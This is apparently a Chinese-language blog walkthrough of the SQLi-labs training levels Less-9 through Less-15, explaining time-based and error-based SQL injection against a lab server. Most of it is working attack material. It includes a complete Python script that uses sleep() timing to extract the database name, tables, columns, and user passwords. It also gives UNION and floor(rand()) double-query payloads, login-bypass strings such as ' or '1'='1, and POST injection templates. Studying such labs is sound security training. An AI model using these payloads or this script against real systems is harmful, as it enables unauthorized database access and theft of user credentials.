<h2 id="Less-9-基于时间的GET单引号盲注"><a href="#Less-9-基于时间的GET单引号盲注" class="headerlink" title="Less-9  基于时间的GET单引号盲注"></a>Less-9  基于时间的GET单引号盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8和9 一样，只是修改了一下闭合形式，第一次出现盲注，看一下源码，没有什么难度，这里使用时间盲注去猜</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-0ae34c6a6fa7686f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 相关函数</span><br><span class="line">	这一关需要用到一个if函数 </span><br><span class="line">	IF(expr1,expr2,expr3) ：既可以作为表达式用，也可在存储过程中作为流程控制语句使用</span><br><span class="line">	expr1 是判断条件 ，成立执行expr2 不成立执行 expr3</span><br><span class="line">	还有一个sleep(seconds) ：执行延迟seconds秒</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 尝试触发报错</span><br><span class="line">	http://192.168.248.144:8080/Less-9/?id=1&apos; and sleep(5) %23</span><br><span class="line">	在尝试sleep()的时候发现了延迟 存在 时间盲注</span><br><span class="line">- 脚本 </span><br><span class="line">	将上一关的改一下 ，所有的放在expr1里执行</span><br><span class="line">	这里 就把上一关的代码放进expr1 然后 if(代码，sleep(0.1),1)</span><br><span class="line">	之后 在判断条件改成 判断时间就行</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">这里的脚本使用了time函数库，经过检测，发现这个库比较精确。可以将延时时间设置为0.1 秒，可以精确判断</span><br><span class="line"># less-9  基于时间的单引号注入</span><br><span class="line">from urllib import request</span><br><span class="line">from urllib import parse</span><br><span class="line">from time import  time</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.64.135/Less-9/?id=&quot;</span><br><span class="line"></span><br><span class="line">#1 查数据库</span><br><span class="line">database_length = 0</span><br><span class="line">while True:</span><br><span class="line">    param = &quot;1&apos; and if(length(database())=&quot;+str(database_length)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param))</span><br><span class="line"></span><br><span class="line">    if ( time() - t &gt; 0.1 ):</span><br><span class="line">        print(&quot;DATABASE_LENGTH:&quot;+str(database_length))</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        database_length += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_name = &quot;&quot;</span><br><span class="line">for l in range(database_length):</span><br><span class="line">    for a in range(128):</span><br><span class="line"></span><br><span class="line">        param = &quot;1&apos; and if(ascii(substr(database(),&quot;  +  str(l+1) +  &quot;))=&quot;  +  str(a) + &quot;,sleep(0.1),1) #&quot;</span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param))</span><br><span class="line"></span><br><span class="line">        if (time()-t &gt;0.1):</span><br><span class="line">            db_name += chr(a)</span><br><span class="line">            break</span><br><span class="line">print(&quot;[*]:&quot;+db_name)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#尝试二分法扫描</span><br><span class="line">db_name = &quot;&quot;</span><br><span class="line">for l in range(database_length):</span><br><span class="line">    a,b = 64,64</span><br><span class="line">    while True:</span><br><span class="line">        b = int(b/2)</span><br><span class="line">        param = &quot;1&apos; and ascii(substr(database(),&quot;  +  str(l+1) +  &quot;))&lt;&quot;  +  str(a) +  &quot;#&quot;</span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">        if (re.search(&quot;You are in&quot;,response)):</span><br><span class="line">            a -=b</span><br><span class="line">        else:</span><br><span class="line">            param = &quot;1&apos; and ascii(substr(database(),&quot;+str(l+1)+&quot;)) =&quot;+str(a)+&quot; #&quot;</span><br><span class="line">            response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line">            if (re.search(&quot;You are in&quot;,response)):</span><br><span class="line">                db_name += chr(a)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                a +=b</span><br><span class="line">print(&quot;db_name:&quot;+ db_name)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#2 查表数量</span><br><span class="line">table_num = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    param = &quot;1 &apos; and if((select count(*) from information_schema.tables where table_schema=database())=&quot;+str(table_num)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param))</span><br><span class="line">    if (time() - t &gt; 0.1 ):</span><br><span class="line">        print(&quot;table_num:&quot;+str(table_num))</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        table_num += 1</span><br><span class="line"></span><br><span class="line"># 查 表长度</span><br><span class="line">def ta_length(num):</span><br><span class="line">    table_length = 0</span><br><span class="line">    while True:</span><br><span class="line">        param = &quot;1&apos; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(num)+&quot;,1),1))=&quot;+str(table_length)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param))</span><br><span class="line">        if (time() - t &gt; 0.1 ):</span><br><span class="line">            return table_length</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            table_length += 1</span><br><span class="line"></span><br><span class="line"># 查表</span><br><span class="line">for n in range(table_num):</span><br><span class="line">    table_name =&quot;&quot;</span><br><span class="line">    for l  in range(ta_length(n)): # 表的长度</span><br><span class="line">        for a in range(0,128): #爆破表</span><br><span class="line">            param = &quot;1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(n)+&quot;,1),&quot;+str(l+1)+&quot;,1)) =&quot;+str(a)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">            t = time()</span><br><span class="line">            response = request.urlopen(url + parse.quote(param))</span><br><span class="line">            if (time() - t &gt; 0.1 ):</span><br><span class="line">                table_name += chr(a)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;table_name:&quot; + table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3 查字段</span><br><span class="line"># 查字段个数</span><br><span class="line">columns_num = 0</span><br><span class="line">while True:</span><br><span class="line">    param = &quot;1&apos; and if((select count(*) from information_schema.columns where table_name=&apos;users&apos;)=&quot;+str(columns_num)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param))</span><br><span class="line">    if (time() - t &gt; 0.1):</span><br><span class="line">        print(&quot;columns_name:&quot;+str(columns_num))</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        columns_num += 1</span><br><span class="line"></span><br><span class="line"># 查每个字段的长度</span><br><span class="line">def co_length(num):</span><br><span class="line">    columns_length = 0</span><br><span class="line">    while True:</span><br><span class="line">        param = &quot;1&apos; and if(length(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit &quot;+str(num)+&quot;,1),1))=&quot;+str(columns_length)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param))</span><br><span class="line"></span><br><span class="line">        if (time() - t &gt; 0.1):</span><br><span class="line">            return columns_length</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            columns_length += 1</span><br><span class="line"># 查每个字段的值</span><br><span class="line">for n in range(columns_num):</span><br><span class="line">    columns_name =&quot;&quot;</span><br><span class="line">    for l  in range(co_length(n)): # 表的长度</span><br><span class="line">        for a in range(0,128): #爆破表</span><br><span class="line">            param = &quot;1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit &quot;+str(n)+&quot;,1),&quot;+str(l+1)+&quot;,1)) =&quot;+str(a)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">            t = time()</span><br><span class="line">            response = request.urlopen(url + parse.quote(param))</span><br><span class="line">            if (time() - t &gt; 0.1):</span><br><span class="line">                columns_name += chr(a)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;table_name:&quot; +columns_name)</span><br><span class="line"></span><br><span class="line"># 下载数据</span><br><span class="line"></span><br><span class="line"># 查 username</span><br><span class="line">num = 0</span><br><span class="line">while True:</span><br><span class="line">    param = &quot;1&apos; and if((select count(*) from users )= &quot;+str(num)+&quot;,sleep(0.1),1)#&quot;</span><br><span class="line">    t = time()</span><br><span class="line">    response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">    if (time() - t &gt; 0.1):</span><br><span class="line">        print(&quot;num:&quot;+str(num))</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        num += 1</span><br><span class="line"></span><br><span class="line">def length(num):</span><br><span class="line">    user_length = 0</span><br><span class="line">    while True:</span><br><span class="line">        param = &quot;1&apos; and if(length(substr((select username from users limit &quot;+str(num)+&quot;,1),1))=&quot;+str(user_length)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">        t = time()</span><br><span class="line">        response = request.urlopen(url + parse.quote(param)).read().decode()</span><br><span class="line"></span><br><span class="line">        if (time() - t &gt; 0.1):</span><br><span class="line">            print(user_length)</span><br><span class="line">            return user_length</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            user_length += 1</span><br><span class="line">def Name(value1,value2):</span><br><span class="line">    for n in range(num):</span><br><span class="line">        columns_name1 = columns_name2 = &quot;&quot;</span><br><span class="line">        for l  in range(length(n)): # 表的长度</span><br><span class="line">            for a in range(0,128): #爆破表</span><br><span class="line">                param = &quot;1&apos; and if(ascii(substr((select &quot;+value1+&quot; from users limit &quot;+str(n)+&quot;,1),&quot;+str(l+1)+&quot;,1)) =&quot;+str(a)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">                t = time()</span><br><span class="line">                response = request.urlopen(url + parse.quote(param))</span><br><span class="line">                if (time() - t &gt; 0.1 ):</span><br><span class="line">                    columns_name1 += chr(a)</span><br><span class="line">                    break</span><br><span class="line"></span><br><span class="line">            for a in range(0,128): #爆破表</span><br><span class="line">                param = &quot;1&apos; and if(ascii(substr((select &quot;+value2+&quot; from users limit &quot;+str(n)+&quot;,1),&quot;+str(l+1)+&quot;,1)) =&quot;+str(a)+&quot;,sleep(0.1),1) #&quot;</span><br><span class="line">                t = time()</span><br><span class="line">                response = request.urlopen(url + parse.quote(param))</span><br><span class="line">                if (time() - t &gt; 0.1 ):</span><br><span class="line">                    columns_name2 += chr(a)</span><br><span class="line">                    break</span><br><span class="line">        print(columns_name1+&quot;:&quot;+columns_name2)</span><br><span class="line">Name(&quot;username&quot;,&quot;password&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="Less-10-基于时间的双引号盲注"><a href="#Less-10-基于时间的双引号盲注" class="headerlink" title="Less-10 基于时间的双引号盲注"></a>Less-10 基于时间的双引号盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">和9 一样，闭合有所改变，所以不多叙述</span><br><span class="line">- 尝试查询发现问题</span><br><span class="line">http://192.168.248.144:8080/Less-10/?id=1&quot; and sleep(5) %23</span><br><span class="line">发现当使用双引号的时候 可能触发时间注入</span><br><span class="line">这里和上题一样 把单引号改成双引号就ok</span><br></pre></td></tr></table></figure>

<h2 id="Less-11-基于错误的PSOT单引号字符"><a href="#Less-11-基于错误的PSOT单引号字符" class="headerlink" title="Less-11 基于错误的PSOT单引号字符"></a>Less-11 基于错误的PSOT单引号字符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接看源码，没有过滤，所以可以将post的uname和passwd单独拿出来当get处理</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-67498f49f68fa588?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里有个小点，一般我们在渗透中 遇到后台会使用万能密码去尝试，能否直接登录，而万能密码的原理就是注入，通过&apos;等等去闭合然后 or 1=1 去获取一个正确的返回，之后用注释符闭合后面的查询，这样就可以绕过登录，直接进入后台 这里出现的漏洞是因为过滤不严格导致的。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">其实这里就是将get的错误在post里重新来了一遍</span><br><span class="line">- 正常登录</span><br><span class="line">	admin，admin</span><br><span class="line">	Your Login name:admin Your Password:admin</span><br><span class="line">	提交的数据都会回显到页面，尝试利用单引号 注释 构造</span><br><span class="line">- 加 &apos; 尝试报错</span><br><span class="line"> 	admin&apos; -- admin 尝试登录</span><br><span class="line"> 	 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos; LIMIT 0,1&apos; at line 1</span><br><span class="line"> 	 admin &apos; or &apos;1&apos;=&apos;1 --+ admin</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-08b4a637ddfdab6c?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&apos; union select  1, database() -- &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">获取到数据库</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-b64f60606a6f56a7?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&apos; union select  1, group_concat(table_name) from information_schema.tables where table_schema=database() --</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-0045e4fbdef8776a?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">按步骤走就行</span><br><span class="line"> 	 uname=-1&apos; union select  1, group_concat(password,username) from users --</span><br><span class="line"> 	 同样也能使用之前的双注来完成</span><br><span class="line"> 	 uname=1&apos; union Select count(*),concat(0x3a,0x3a,(select group_concat(schema_name) from information_schema.schemata),0x3a,0x3a,floor(rand(0)*2))a from information_schema.schemata group by a#</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-c88504828851cad4?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-12-基于错误的双引号POST型字符变形注入"><a href="#Less-12-基于错误的双引号POST型字符变形注入" class="headerlink" title="Less-12 基于错误的双引号POST型字符变形注入"></a>Less-12 基于错误的双引号POST型字符变形注入</h2><p>直接看源码，看是如何写的，然后如何过滤</p>
<p>做了这么多，已经知道了如何过滤，通过“）即可</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-3041fd657503e12b?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">admin/admin</span><br><span class="line">返回：Your Login name:admin/Your Password:admin</span><br><span class="line">- 加&quot; 报错</span><br><span class="line"> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&quot;) LIMIT 0,1&apos; at line 1</span><br><span class="line">- 尝试绕过获取</span><br><span class="line">	admin &quot;) -- // 注意 -- 后面有个空格，绕过</span><br><span class="line">	之后就是获取数据了</span><br><span class="line">	-1&quot;) union select 1,database() -- // 获取数据库为security</span><br><span class="line">	-1&quot;) union select 1,group_concat(0x7c,table_name,0x7c) from information_schema.tables where table_schema=database() -- // 获取表 </span><br><span class="line">	-1&quot;) union select 1,group_concat(0x7c,column_name,0x7c) from information_schema.columns where table_name=&apos;users&apos; -- // 获取字段</span><br><span class="line">	-1&quot;) union select 1,group_concat(0x7c,username,0x7e,password,0x7c) from users -- // 拿到数据</span><br></pre></td></tr></table></figure>

<h2 id="Less-13-POST-单引号变形双注入"><a href="#Less-13-POST-单引号变形双注入" class="headerlink" title="Less-13 POST 单引号变形双注入"></a>Less-13 POST 单引号变形双注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">admin/admin 发现没有返回值，那么这里就有可能是正确没有返回值</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 尝试绕过</span><br><span class="line"> 通过 a&apos;) or 1=1 --  // 绕过验证</span><br><span class="line"> 获取尝试 永真闭合 &apos;) or (&apos;1&apos;)=(&apos;1</span><br><span class="line"> 为什么这里可以闭合呢，这个和之前的注释符闭合类似，</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 之后尝试获取数据</span><br><span class="line">- 获取数据</span><br><span class="line">	0&apos;) union all select count(*),2,concat( &apos;~&apos;,(select schema_name from information_schema.schemata limit 4,1),&apos;~&apos;,floor(rand()*2)) as a from information_schema.schemata group by a %23 </span><br><span class="line"> 	0&apos;) union select count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables  where table_schema=database() limit 3,1),&apos;~&apos;,floor(rand(0)*2)) a  from information_schema.tables  group by a # // users</span><br><span class="line">    0&apos;) union select count(*),concat(&apos;~&apos;,(select column_name from information_schema.columns  where table_name=&apos;users&apos; limit 1,1),&apos;~&apos;,floor(rand(0)*2)) a  from information_schema.columns  group by a # </span><br><span class="line">     0&apos;) union select count(*),concat(&apos;~&apos;,(select concat(username,password) from users limit 0,1),&apos;~&apos;,floor(rand(0)*2)) a  from information_schema.columns  group by a #</span><br></pre></td></tr></table></figure>

<p>通过闭合成功获取到了用户名和密码</p>
<p><img src="https://upload-images.jianshu.io/upload_images/18851353-e9fea547643fdd4e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-14-POST双引号变形双注入"><a href="#Less-14-POST双引号变形双注入" class="headerlink" title="Less-14 POST双引号变形双注入"></a>Less-14 POST双引号变形双注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">来看一下源码，闭合很简单，就不多叙述了，为什么要用双注呢，和get类似，反正正确，错误无回显，但是语句报错，这里就想到使用双注去执行。</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-466788ca989fb1f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- 正常访问</span><br><span class="line">admin/admin</span><br><span class="line">访问正常</span><br><span class="line">- 绕过</span><br><span class="line">和13一样 改单引号为双引号就可以绕过</span><br><span class="line">&quot; or &quot;1&quot;=&quot;1 这样就可以绕过验证登录</span><br><span class="line">- 获取数据</span><br><span class="line">0&quot; union select count(*),concat(&apos;~&apos;,(select table_name from information_schema.tables where table_schema=database() limit 3,1),&apos;~&apos;,floor(rand(0)*2)) a from information_schema.tables group by a #</span><br><span class="line">0&quot; union select count(*),concat(&apos;~&apos;,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),&apos;~&apos;,floor(rand(0)*2)) a from information_schema.tables group by a #</span><br><span class="line">0&quot; union select count(*),concat(&apos;~&apos;,(select password from users limit 0,1),&apos;~&apos;,floor(rand(0)*2)) a from users group by a #</span><br><span class="line">0&quot; union  select count(*),concat( &apos;~&apos;,(select concat(id,username,password) from users limit 0,1),&apos;~&apos;,floor(rand(0)*2)) as a from information_schema.schemata group by a %23</span><br><span class="line">// 注意 由于正常访问没有回显 ，所以最好加个-1 来报错</span><br><span class="line">成功获取到用户名和密码</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-f8179e2915cb9b7f?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
<h2 id="Less-15-基于bool型-时间延迟单引号POST型盲注"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注" class="headerlink" title="Less-15 基于bool型/时间延迟单引号POST型盲注"></a>Less-15 基于bool型/时间延迟单引号POST型盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-正常访问</span><br><span class="line">admin/admin</span><br><span class="line">登录成功</span><br><span class="line"></span><br><span class="line">- 脚本跑</span><br><span class="line"> 理解扫描的方式： 确定数据库的数量，确定数据库的长度，确定数据库</span><br><span class="line"> 我们可以通过大于数据库的个数这样就不用去判断数据库的长度，之后长度也可以通过时间报错信息去判断，在加上判断 是否是这个字符 一共需要三层循环就可以解决</span><br><span class="line">  这里有两种方式去判断 ，使用ascii判断 ，或者通过mid 截断去判断。</span><br><span class="line">   data = &#123;&apos;uname&apos;: &quot;admin&apos;and If((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=&apos;%s&apos;,sleep(0.1),1)#&quot; % ( i, j, str), &apos;passwd&apos;: &quot;1&quot;&#125;</span><br><span class="line">   data = &#123;&apos;uname&apos;: &quot;admin&apos;and If((mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=&apos;%s&apos;,sleep(0.1),1)#&quot; % ( i, j, str), &apos;passwd&apos;: &quot;1&quot;&#125;</span><br><span class="line">   data = &#123;&apos;uname&apos;: &quot;admin&apos;and If((mid((select column_name from information_schema.columns where table_name=&apos;users&apos; limit %d,1),%d,1))=&apos;%s&apos;,sleep(0.1),1)#&quot; % ( i, j, str), &apos;passwd&apos;: &quot;1&quot;&#125;</span><br><span class="line">   data = &#123;&apos;uname&apos;: &quot;admin&apos;and If((mid((select username from users limit %d,1),%d,1))=&apos;%s&apos;,sleep(0.1),1)#&quot; % ( i, j, str), &apos;passwd&apos;: &quot;1&quot;&#125;</span><br><span class="line">   data = &#123;&apos;uname&apos;: &quot;admin&apos;and If((mid((select password from users limit %d,1),%d,1))=&apos;%s&apos;,sleep(0.1),1)#&quot; % ( i, j, str), &apos;passwd&apos;: &quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 绕过</span><br><span class="line">&apos; or sleep(5) --  存在延时</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/18851353-80ec6030c4ff6a23?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在这里插入图片描述"></p>
